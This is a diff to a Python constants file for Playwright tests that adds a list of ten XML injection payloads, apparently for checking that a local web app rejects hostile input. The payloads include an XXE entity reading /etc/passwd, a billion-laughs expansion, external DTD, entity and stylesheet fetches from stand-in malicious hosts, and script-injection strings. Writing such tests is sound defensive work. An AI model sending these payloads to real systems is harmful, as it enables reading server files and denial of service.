@@ -1,6 +1,20 @@
 """ Constants for the playwright tests. """
 BASE_URL = "http://127.0.0.1:5000/"
 
+TEST_XML_INJECTIONS = [
+    """<?xml version="1.0" ?><!DOCTYPE root [<!ENTITY ext SYSTEM "file:///etc/passwd">]><root><test>&ext;</test></root>""",
+    """<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;">]><lolz>&lol9;</lolz>""",
+    """<?xml version="1.0"?><!DOCTYPE root SYSTEM "http://example.com/malicious.dtd"><root><payload>test</payload></root>""",
+    """<?xml version="1.0"?><root><![CDATA[<script>alert('Injected JS');</script>]]></root>""",
+    """<root><test><script>alert('Injected!');</script></test></root>""",
+    """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY remoteEntity SYSTEM "http://malicious.example.com/evil.xml">]><root><data>&remoteEntity;</data></root>""",
+    """<!-- Attempting to hide payload in comments --><!-- <script>document.cookie = 'stolen';</script> --><root>Legitimate content</root>""",
+    """<root><normal>Value</normal></root></malicious>""",
+    """<?xml version="1.0"?><?xml-stylesheet type="text/xsl" href="http://malicious.example.com/evil.xsl"?><root><data>Test</data></root>""",
+    """<root><script>var injectedValue = 'ThisIsInjected'; alert('JS variable set: ' + injectedValue);</script></root>"""
+]
+
+
 EPOCH_OPTIONS = [
     {
         'number': '39',
